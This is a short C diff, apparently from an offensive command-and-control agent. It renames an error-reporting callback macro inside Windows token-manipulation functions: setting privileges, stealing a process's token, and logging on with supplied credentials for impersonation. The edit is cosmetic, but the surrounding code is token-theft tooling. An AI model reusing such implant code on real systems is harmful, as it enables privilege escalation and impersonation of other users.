@@ -20,7 +20,7 @@ BOOL TokenSetPrivilege( LPSTR Privilege, BOOL Enable )
     if ( ! Instance->Win32.LookupPrivilegeValueA( NULL, Privilege, &TokenLUID ) )
     {
         PRINTF( "[-] LookupPrivilegeValue error: %u\n", NtGetLastError() );
-        SEND_WIN32_BACK
+        CALLBACK_GETLASTERROR
         return FALSE;
     }
 
@@ -113,7 +113,7 @@ HANDLE TokenSteal( DWORD ProcessID )
             if ( ! Win32_DuplicateTokenEx( hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation | SecurityIdentification, TokenPrimary, &hTokenDup ) )
             {
                 PRINTF( "[!] DuplicateTokenEx() error : % u\n", NtGetLastError()) ;
-                SEND_WIN32_BACK
+                CALLBACK_GETLASTERROR
             }
             else PRINTF( "Successful duplicated token: %x\n", hToken )
         }
@@ -268,14 +268,14 @@ HANDLE TokenMake( LPSTR User, LPSTR Password, LPSTR Domain )
     if ( ! Instance->Win32.RevertToSelf() )
     {
         PRINTF( "Failed to revert to self: Error:[%d]\n", NtGetLastError() )
-        SEND_WIN32_BACK
+        CALLBACK_GETLASTERROR
         // TODO: at this point should I return NULL or just continue ? For now i just continue.
     }
 
     if ( ! Instance->Win32.LogonUserA( User, Password, Domain, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
     {
         PUTS( "LogonUserA: Failed" )
-        SEND_WIN32_BACK
+        CALLBACK_GETLASTERROR
     }
 
     return hToken;
